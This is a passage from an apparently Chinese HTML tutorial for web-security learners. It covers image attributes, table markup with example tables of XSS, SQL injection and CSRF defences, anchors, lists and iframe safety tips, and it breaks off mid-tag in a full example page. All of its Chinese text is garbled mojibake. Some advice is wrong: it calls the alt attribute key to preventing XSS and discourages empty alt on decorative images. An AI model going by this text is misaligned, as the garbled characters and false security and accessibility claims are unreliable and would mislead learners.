<li><code>alt</code>ï¼šæ›¿ä»£æ–‡æœ¬ï¼Œå½“å›¾åƒæ— æ³•åŠ è½½æ—¶æ˜¾ç¤ºï¼Œå¯¹SEOå’Œå¯è®¿é—®æ€§è‡³å…³é‡è¦ï¼Œä¹Ÿæ˜¯é˜²æ­¢XSSæ”»å‡»çš„å…³é”®</li>
<li><code>width</code>&#x2F;<code>height</code>ï¼šè®¾ç½®å›¾åƒå°ºå¯¸ï¼ˆå»ºè®®åŒæ—¶è®¾ç½®ä»¥é¿å…å¸ƒå±€æŠ–åŠ¨ï¼‰</li>
<li><code>loading=&quot;lazy&quot;</code>ï¼šå»¶è¿ŸåŠ è½½ï¼Œæå‡é¡µé¢æ€§èƒ½</li>
<li><strong>å®‰å…¨æç¤º</strong>ï¼šå§‹ç»ˆè®¾ç½®<code>alt</code>å±æ€§ï¼Œé¿å…ç©ºaltï¼ˆalt&#x3D;â€â€ï¼‰ç”¨äºè£…é¥°æ€§å›¾ç‰‡</li>
</ul>
<h4 id="tableæ ‡ç­¾ï¼ˆè¡¨æ ¼ï¼‰"><a href="#tableæ ‡ç­¾ï¼ˆè¡¨æ ¼ï¼‰" class="headerlink" title="tableæ ‡ç­¾ï¼ˆè¡¨æ ¼ï¼‰"></a>tableæ ‡ç­¾ï¼ˆè¡¨æ ¼ï¼‰</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>å¸¸è§Webå®‰å…¨æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>å±å®³ç­‰çº§<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ£€æµ‹æ–¹æ³•<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>é˜²å¾¡æªæ–½<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>è¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç æ£€æŸ¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹è¾“å‡ºè¿›è¡ŒHTMLç¼–ç <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLæ³¨å…¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLè¯­å¥å‚æ•°åŒ–æŸ¥è¯¢æ£€æŸ¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ã€ORMæ¡†æ¶<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>ä¸­<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>æ£€æŸ¥Refererå¤´ã€CSRFä»¤ç‰ŒéªŒè¯<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å®æ–½CSRFä»¤ç‰Œæœºåˆ¶ã€SameSite Cookieå±æ€§<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>è¡¨æ ¼ç»“æ„è¯¦è§£ï¼š</strong></p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>ä½œç”¨</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;table&gt;</code></td>
<td>è¡¨æ ¼å®¹å™¨</td>
<td>å®šä¹‰è¡¨æ ¼çš„å¼€å§‹å’Œç»“æŸ</td>
</tr>
<tr>
<td><code>&lt;caption&gt;</code></td>
<td>è¡¨æ ¼æ ‡é¢˜</td>
<td>æ”¾ç½®åœ¨è¡¨æ ¼é¡¶éƒ¨ï¼Œæè¿°è¡¨æ ¼å†…å®¹</td>
</tr>
<tr>
<td><code>&lt;thead&gt;</code></td>
<td>è¡¨å¤´éƒ¨åˆ†</td>
<td>åŒ…å«è¡¨æ ¼çš„è¡¨å¤´è¡Œï¼Œé€šå¸¸åŒ…å«<code>&lt;tr&gt;</code>å’Œ<code>&lt;th&gt;</code></td>
</tr>
<tr>
<td><code>&lt;tbody&gt;</code></td>
<td>è¡¨æ ¼ä¸»ä½“</td>
<td>åŒ…å«è¡¨æ ¼çš„ä¸»è¦æ•°æ®è¡Œ</td>
</tr>
<tr>
<td><code>&lt;tfoot&gt;</code></td>
<td>è¡¨å°¾éƒ¨åˆ†</td>
<td>åŒ…å«è¡¨æ ¼çš„æ€»ç»“è¡Œï¼ˆå¯é€‰ï¼‰</td>
</tr>
<tr>
<td><code>&lt;tr&gt;</code></td>
<td>è¡¨æ ¼è¡Œ</td>
<td>å®šä¹‰ä¸€è¡Œæ•°æ®</td>
</tr>
<tr>
<td><code>&lt;th&gt;</code></td>
<td>è¡¨å¤´å•å…ƒæ ¼</td>
<td>é»˜è®¤åŠ ç²—å¹¶å±…ä¸­æ˜¾ç¤ºï¼Œç”¨äºè¡¨å¤´</td>
</tr>
<tr>
<td><code>&lt;td&gt;</code></td>
<td>æ™®é€šå•å…ƒæ ¼</td>
<td>ç”¨äºè¡¨æ ¼ä¸­çš„å¸¸è§„æ•°æ®å•å…ƒæ ¼</td>
</tr>
</tbody></table>
<p><strong>åˆå¹¶å•å…ƒæ ¼ç¤ºä¾‹ï¼š</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>æ¼æ´ç±»å‹ä¸é˜²å¾¡æªæ–½<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>é˜²å¾¡æªæ–½<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>è¾“å…¥è¿‡æ»¤<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>è¾“å‡ºç¼–ç <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>ä½¿ç”¨Content Security Policy (CSP)<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLæ³¨å…¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>å‚æ•°åŒ–æŸ¥è¯¢ã€ORMæ¡†æ¶<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>ç°ä»£è¡¨æ ¼æ ·å¼ï¼ˆæ¨èï¼‰ï¼š</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.security-table</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.security-table</span> <span class="selector-tag">th</span>, <span class="selector-class">.security-table</span> <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.security-table</span> <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.high-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.medium-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#f39c12</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.low-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#2ecc71</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;security-table&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>å¸¸è§Webå®‰å…¨æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>å±å®³ç­‰çº§<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ£€æµ‹æ–¹æ³•<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>é˜²å¾¡æªæ–½<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>è¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç æ£€æŸ¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹è¾“å‡ºè¿›è¡ŒHTMLç¼–ç <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLæ³¨å…¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLè¯­å¥å‚æ•°åŒ–æŸ¥è¯¢æ£€æŸ¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ã€ORMæ¡†æ¶<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;medium-risk&quot;</span>&gt;</span>ä¸­<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>æ£€æŸ¥Refererå¤´ã€CSRFä»¤ç‰ŒéªŒè¯<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å®æ–½CSRFä»¤ç‰Œæœºåˆ¶ã€SameSite Cookieå±æ€§<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>è¡¨æ ¼ä½¿ç”¨æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>ä¸è¦ç”¨è¡¨æ ¼åšé¡µé¢å¸ƒå±€ï¼Œç°ä»£Webå¼€å‘åº”ä½¿ç”¨CSS Flexboxæˆ–Grid</li>
<li>è¡¨æ ¼åº”åªç”¨äºå±•ç¤ºè¡¨æ ¼å½¢å¼çš„æ•°æ®</li>
<li>ä¸ºè¡¨æ ¼æ·»åŠ é€‚å½“çš„æ ‡é¢˜å’Œæè¿°ï¼Œæé«˜å±å¹•é˜…è¯»å™¨çš„å¯è®¿é—®æ€§</li>
</ul>
<h3 id="2-6-é”šæ–‡æœ¬"><a href="#2-6-é”šæ–‡æœ¬" class="headerlink" title="2.6 é”šæ–‡æœ¬"></a>2.6 é”šæ–‡æœ¬</h3><p>é”šæ–‡æœ¬ç”¨äºé¡µé¢å†…è·³è½¬ï¼Œé€šè¿‡<code>id</code>å±æ€§å®šä¹‰é”šç‚¹ï¼Œç„¶åä½¿ç”¨<code>&lt;a href=&quot;#id&quot;&gt;</code>é“¾æ¥åˆ°è¯¥ä½ç½®ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- é”šç‚¹é“¾æ¥ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section3&quot;</span>&gt;</span>è·³è½¬åˆ°ç« èŠ‚3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- é”šç‚¹å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;section3&quot;</span>&gt;</span>ç« èŠ‚3<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™æ˜¯ç« èŠ‚3çš„å†…å®¹ï¼Œç‚¹å‡»ä¸Šæ–¹é“¾æ¥å¯å¿«é€Ÿè·³è½¬è‡³æ­¤<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>æœ€ä½³å®è·µï¼š</strong></p>
<ul>
<li>ä½¿ç”¨<code>id</code>å±æ€§å®šä¹‰é”šç‚¹ï¼ˆç°ä»£æ ‡å‡†ï¼‰ï¼Œè€Œé<code>name</code>å±æ€§</li>
<li>é”šç‚¹IDåº”å…·æœ‰è¯­ä¹‰æ€§ï¼Œå¦‚<code>id=&quot;contact-form&quot;</code>è€Œé<code>id=&quot;section1&quot;</code></li>
<li>é¿å…åœ¨å•é¡µåº”ç”¨ä¸­è¿‡åº¦ä½¿ç”¨é”šç‚¹ï¼Œå¯èƒ½å½±å“ç”¨æˆ·ä½“éªŒ</li>
</ul>
<h3 id="2-7-åˆ—è¡¨æ ‡ç­¾"><a href="#2-7-åˆ—è¡¨æ ‡ç­¾" class="headerlink" title="2.7 åˆ—è¡¨æ ‡ç­¾"></a>2.7 åˆ—è¡¨æ ‡ç­¾</h3><h4 id="æ— åºåˆ—è¡¨"><a href="#æ— åºåˆ—è¡¨" class="headerlink" title="æ— åºåˆ—è¡¨"></a>æ— åºåˆ—è¡¨</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">style</span>=<span class="string">&quot;list-style-type: circle;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>é¡¹ç›®1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>é¡¹ç›®2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>é¡¹ç›®3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æœ‰åºåˆ—è¡¨"><a href="#æœ‰åºåˆ—è¡¨" class="headerlink" title="æœ‰åºåˆ—è¡¨"></a>æœ‰åºåˆ—è¡¨</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;A&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸€é¡¹<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬äºŒé¡¹<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸‰é¡¹<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ—è¡¨ç±»å‹è¯´æ˜ï¼š</strong></p>
<ul>
<li>æ— åºåˆ—è¡¨(<code>ul</code>)ï¼šé¡¹ç›®ç¬¦å·æ ·å¼å¯é€šè¿‡CSSæ§åˆ¶ï¼ˆdisc, circle, squareï¼‰</li>
<li>æœ‰åºåˆ—è¡¨(<code>ol</code>)ï¼š<code>type</code>å±æ€§å¯æŒ‡å®šç¼–å·æ ·å¼ï¼š<ul>
<li><code>1</code>ï¼šæ•°å­—ï¼ˆé»˜è®¤ï¼‰</li>
<li><code>A</code>ï¼šå¤§å†™å­—æ¯</li>
<li><code>a</code>ï¼šå°å†™å­—æ¯</li>
<li><code>I</code>ï¼šå¤§å†™ç½—é©¬æ•°å­—</li>
<li><code>i</code>ï¼šå°å†™ç½—é©¬æ•°å­—</li>
</ul>
</li>
<li><strong>ç°ä»£å®è·µ</strong>ï¼šåˆ—è¡¨æ ·å¼åº”ä½¿ç”¨CSSæ§åˆ¶ï¼Œè€ŒéHTMLå±æ€§</li>
</ul>
<h3 id="2-8-æ¡†æ¶çš„ä½¿ç”¨"><a href="#2-8-æ¡†æ¶çš„ä½¿ç”¨" class="headerlink" title="2.8 æ¡†æ¶çš„ä½¿ç”¨"></a>2.8 æ¡†æ¶çš„ä½¿ç”¨</h3><p><strong>é‡è¦æç¤º</strong>ï¼š<code>&lt;frameset&gt;</code> åœ¨HTML5ä¸­å·²è¢«åºŸå¼ƒï¼Œ<strong>ä¸æ¨èä½¿ç”¨</strong>ã€‚ç°ä»£ç½‘é¡µå¼€å‘ä¸­åº”ä½¿ç”¨<code>&lt;iframe&gt;</code>åµŒå…¥å…¶ä»–é¡µé¢ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;https://www.example.com&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">height</span>=<span class="string">&quot;600&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">scrolling</span>=<span class="string">&quot;auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">title</span>=<span class="string">&quot;ç¤ºä¾‹åµŒå…¥é¡µé¢&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #ccc;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>iframeå±æ€§è¯¦è§£ï¼š</strong></p>
<ul>
<li><code>src</code>ï¼šåµŒå…¥é¡µé¢çš„URL</li>
<li><code>width</code>&#x2F;<code>height</code>ï¼šå°ºå¯¸ï¼ˆå»ºè®®ä½¿ç”¨CSSæ§åˆ¶ï¼‰</li>
<li><code>scrolling</code>ï¼šæ»šåŠ¨æ¡è¡Œä¸ºï¼ˆauto&#x2F;yes&#x2F;noï¼‰</li>
<li><code>title</code>ï¼šæä¾›æè¿°ï¼Œæé«˜å¯è®¿é—®æ€§</li>
<li><strong>å®‰å…¨æ³¨æ„</strong>ï¼šåµŒå…¥ç¬¬ä¸‰æ–¹å†…å®¹æ—¶éœ€è°¨æ…ï¼Œé˜²æ­¢XSSæ”»å‡»</li>
</ul>
<p><strong>å®‰å…¨æç¤º</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>allow</code>å±æ€§é™åˆ¶iframeåŠŸèƒ½</li>
<li>è®¾ç½®<code>sandbox</code>å±æ€§å¢å¼ºå®‰å…¨æ€§</li>
<li>é¿å…åµŒå…¥ä¸å¯ä¿¡çš„ç¬¬ä¸‰æ–¹å†…å®¹</li>
<li>é…ç½®CSPçš„<code>frame-ancestors</code>æŒ‡ä»¤æ§åˆ¶iframeåµŒå…¥</li>
</ul>
<h2 id="ç»¼åˆç¤ºä¾‹ï¼šWEBå®‰å…¨å­¦ä¹ å¹³å°"><a href="#ç»¼åˆç¤ºä¾‹ï¼šWEBå®‰å…¨å­¦ä¹ å¹³å°" class="headerlink" title="ç»¼åˆç¤ºä¾‹ï¼šWEBå®‰å…¨å­¦ä¹ å¹³å°"></a>ç»¼åˆç¤ºä¾‹ï¼šWEBå®‰å…¨å­¦ä¹ å¹³å°</h2><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰çŸ¥è¯†ç‚¹çš„å®Œæ•´HTMLé¡µé¢ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•å°†å„ç§HTMLæ ‡ç­¾ç»„åˆæˆä¸€ä¸ªå®ç”¨çš„WEBå®‰å…¨å­¦ä¹ é¡µé¢ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;WEBå®‰å…¨HTMLåŸºç¡€ç»¼åˆç¤ºä¾‹ - å®‰å…¨åŸ¹è®­è¯¾ç¨‹&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ç½‘ç»œå®‰å…¨, WEBæ¸—é€, æ•°æ®å®‰å…¨, æ¸—é€æµ‹è¯•, å®‰å…¨åŸ¹è®­, HTMLåŸºç¡€&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;moonsec&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span 